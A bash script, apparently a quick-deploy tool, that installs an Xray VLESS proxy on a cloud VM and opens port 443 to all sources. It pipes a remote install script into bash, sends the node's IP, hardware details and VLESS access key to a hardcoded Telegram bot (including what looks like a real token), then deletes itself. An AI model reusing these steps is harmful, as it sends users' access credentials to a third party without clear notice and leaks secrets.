#!/bin/bash

# --- Configuration ---
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
UUID=$(cat /proc/sys/kernel/random/uuid)
PORT=443
SNI="m.googleapis.com"
PATH_NAME="/sos-vless"
# စက္ကန့်အလိုက် အချိန်သတ်မှတ်ရန် (ဥပမာ - 7200 ဆိုလျှင် ၂ နာရီ)
TIMER=7200 

# 1. System Speed Boost (BBR & RAM Fix)
clear
echo -e "\e[1;33m[*] System Optimization in progress...\e[0m"
sudo sysctl -w vm.swappiness=10 > /dev/null
echo "net.core.default_qdisc=fq" | sudo tee -a /etc/sysctl.conf > /dev/null
echo "net.ipv4.tcp_congestion_control=bbr" | sudo tee -a /etc/sysctl.conf > /dev/null
sudo sysctl -p > /dev/null

# 2. Server Metadata
IP=$(curl -s ifconfig.me)
ISP=$(curl -s ipinfo.io/org)
CPU_MODEL=$(grep -m1 'model name' /proc/cpuinfo | awk -F: '{print $2}' | sed 's/^[ \t]*//')
RAM_TOTAL=$(free -m | awk '/^Mem:/{print $2}')

# 3. Installing Xray High-Performance Core
echo -e "\e[1;32m[*] Deploying Xray Engine...\e[0m"
bash <(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh) 2>/dev/null

# 4. JSON Config
cat <<EOF > /usr/local/etc/xray/config.json
{
  "inbounds": [{
    "port": $PORT,
    "protocol": "vless",
    "settings": {
        "clients": [{ "id": "$UUID" }],
        "decryption": "none"
    },
    "streamSettings": {
        "network": "ws",
        "wsSettings": { "path": "$PATH_NAME" }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# 5. Firewall & Service Start
gcloud compute firewall-rules create allow-vless-$(date +%s) --allow tcp:$PORT --priority 1000 --direction INGRESS --action ALLOW --source-ranges 0.0.0.0/0 2>/dev/null
systemctl restart xray && systemctl enable xray

# 6. Auto-Shutdown Timer (Background Task)
# သတ်မှတ်ချိန်ပြည့်ရင် Xray ကို ရပ်တန့်စေခြင်း
(sleep $TIMER && systemctl stop xray && echo "Server Stopped Automatically") &

# 7. VLESS Link Creation
VLESS_KEY="vless://$UUID@$IP:$PORT?type=ws&security=none&path=%2Fsos-vless&host=$SNI&sni=$SNI#$DEV_NAME-AUTO-STOP"

# 8. Telegram Notification
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>

🚀 <b>SMART NODE DEPLOYED</b>

📟 <b>CPU:</b> $CPU_MODEL
📟 <b>RAM:</b> ${RAM_TOTAL}MB
🌍 <b>ISP:</b> $ISP
⏳ <b>Timer:</b> 2 Hours (Auto-Stop)

✨ <b>KEY:</b>
<code>$VLESS_KEY</code>"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" -d "parse_mode=HTML" > /dev/null

echo -e "\e[1;32m✅ Done! Server will automatically stop in 2 hours.\e[0m"
rm -- "$0"
